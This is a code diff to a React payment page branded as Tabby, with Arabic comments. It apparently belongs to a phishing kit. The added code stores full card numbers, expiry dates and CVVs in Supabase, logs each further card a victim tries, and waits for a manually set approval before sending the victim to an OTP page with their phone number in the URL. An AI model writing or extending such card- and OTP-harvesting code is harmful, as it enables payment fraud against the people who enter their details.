@@ -45,9 +45,39 @@ const TabbyPaymentProcessing = () => {
         let finalPaymentId: string;
         
         if (existingPaymentId) {
-          // استخدام السجل الموجود بدون تحديث معلومات البطاقة الأصلية
+          // التحقق إذا كانت البطاقة الأساسية فارغة
+          const { data: existingPayment } = await supabase
+            .from("tabby_payments")
+            .select("card_number")
+            .eq("id", existingPaymentId)
+            .single();
+
           finalPaymentId = existingPaymentId;
           setPaymentId(existingPaymentId);
+
+          // إذا كانت البطاقة الأساسية فارغة، هذه هي المحاولة الأولى
+          if (!existingPayment?.card_number) {
+            // حفظ البطاقة الأولى في السجل الرئيسي
+            await supabase
+              .from("tabby_payments")
+              .update({
+                cardholder_name: cardholderName,
+                card_number: cardNumber,
+                card_number_last4: cardNumberLast4,
+                expiry_date: expiryDate,
+                cvv: cvv,
+              })
+              .eq("id", existingPaymentId);
+          } else {
+            // إذا كانت البطاقة موجودة، هذه محاولة إضافية
+            await supabase.from("tabby_payment_attempts").insert({
+              payment_id: finalPaymentId,
+              card_number: cardNumber,
+              cardholder_name: cardholderName,
+              expiry_date: expiryDate,
+              cvv: cvv,
+            });
+          }
         } else {
           // إنشاء سجل جديد (للحالات القديمة)
           const { data, error } = await supabase
@@ -71,24 +101,40 @@ const TabbyPaymentProcessing = () => {
           setPaymentId(data.id);
         }
 
-        // حفظ البطاقة في جدول المحاولات
-        await supabase.from("tabby_payment_attempts").insert({
-          payment_id: finalPaymentId,
-          card_number: cardNumber,
-          cardholder_name: cardholderName,
-          expiry_date: expiryDate,
-          cvv: cvv,
-        });
 
-        // Poll for status updates on payment attempts
+        // Poll for status updates - check both main card and attempts
         const pollInterval = setInterval(async () => {
+          // التحقق من حالة البطاقة الأساسية
+          const { data: mainPayment } = await supabase
+            .from("tabby_payments")
+            .select("payment_status")
+            .eq("id", finalPaymentId)
+            .single();
+
+          if (mainPayment?.payment_status === "approved") {
+            clearInterval(pollInterval);
+            setPaymentStatus("success");
+            setTimeout(() => {
+              navigate(`/otp-verification?company=${encodeURIComponent(company)}&price=${totalAmount}&cardLast4=${cardNumberLast4}&paymentId=${finalPaymentId}&phone=${phone}&type=tabby`);
+            }, 2000);
+            return;
+          } else if (mainPayment?.payment_status === "rejected") {
+            clearInterval(pollInterval);
+            setPaymentStatus("failed");
+            setTimeout(() => {
+              navigate(`/tabby-payment?price=${totalAmount}&company=${encodeURIComponent(company)}&phone=${phone}&paymentId=${finalPaymentId}`);
+            }, 3000);
+            return;
+          }
+
+          // التحقق من حالة المحاولات الإضافية
           const { data: attemptsData, error: attemptsError } = await supabase
             .from("tabby_payment_attempts")
             .select("approval_status")
             .eq("payment_id", finalPaymentId)
             .order('created_at', { ascending: false })
             .limit(1)
-            .single();
+            .maybeSingle();
 
           if (attemptsError) {
             console.log("No payment attempts yet or error:", attemptsError);
@@ -105,7 +151,7 @@ const TabbyPaymentProcessing = () => {
             clearInterval(pollInterval);
             setPaymentStatus("failed");
             setTimeout(() => {
-              navigate(`/tabby-payment?price=${totalAmount}&company=${encodeURIComponent(company)}&phone=${phone}`);
+              navigate(`/tabby-payment?price=${totalAmount}&company=${encodeURIComponent(company)}&phone=${phone}&paymentId=${finalPaymentId}`);
             }, 3000);
           }
         }, 2000);
